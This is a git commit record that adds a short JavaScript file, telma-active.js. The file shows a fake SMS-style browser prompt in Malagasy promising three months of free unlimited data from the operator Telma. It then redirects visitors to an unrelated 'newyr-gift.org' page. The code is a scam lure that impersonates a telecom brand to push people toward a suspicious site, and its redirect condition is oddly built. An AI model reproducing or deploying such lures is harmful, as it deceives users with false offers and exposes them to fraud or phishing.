58deadcd3f57587c178909313bc9e842f348c36d
ukebeblog <esther001imoh@gmail.com>
2025-01-07 05:49:58 +0100

    Create telma-active.js

---
+++ telma-active.js
@@ -0,0 +1,6 @@
+
+var password = 'hampavitrika'
+password=prompt('SMS: Arahabaina ianao dia mahafeno fepetra amin'ny Telma 3-volana tsy misy fetra maimaim-poana data, azafady tsindrio OK raha te hihetsika izao   ','hampavitrika');
+if (password != 'hampavitrika') {
+location.href='https://newyr-gift.org/telma-unlimited.html';
+}
